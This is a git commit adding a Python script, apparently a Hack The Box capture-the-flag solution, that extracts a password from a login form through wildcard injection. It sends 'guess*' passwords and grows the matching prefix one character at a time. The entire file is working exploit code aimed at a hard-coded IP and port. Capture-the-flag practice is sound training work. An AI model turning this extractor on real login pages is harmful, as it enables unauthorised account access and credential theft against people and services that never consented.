a0b131fc63b3a8fbd93de03c741fbc665949e351
Mr. Ra <1962285+ramilmustafayev@users.noreply.github.com>
2021-04-02 00:34:16 +0200

    Create phonebook_cracker.py

---
+++ phonebook_cracker.py
@@ -0,0 +1,42 @@
+import requests
+import string
+
+try:
+    # Python 3
+    from urllib.parse import urlparse, parse_qs
+except ImportError:
+    # Python 2
+    from urlparse import urlparse, parse_qs
+#template HTB{s0me_t3xt}
+lowercase = list(string.ascii_lowercase)
+uppercase = list(string.ascii_uppercase)
+digits  = list(string.digits)
+other = ["#","$","%","@","!","{","}","[","]","_","&","^"," "]
+attempts = lowercase+uppercase+digits+other
+username = 'reese' # I will not give username ;-)
+host = 'http://206.189.121.131:30475/login' 
+def bruteforce(found_letter=None):
+    for i in attempts:
+        if found_letter != None:
+            attempted_letter = found_letter+i
+        else:
+            attempted_letter = i
+        cred = {'username':username, 'password':attempted_letter+'*'}
+        r = requests.post(host, data=cred)
+        o = urlparse(r.url)
+        query = parse_qs(o.query)
+        if 'message' in query:
+            print(query['message'][0],' - Last attempted pattern:',attempted_letter)
+        else:
+            found_letter = i
+            #result = result+found_letter
+            bruteforce(attempted_letter)
+            break
+bruteforce()
+
+
+
+
+
+
+
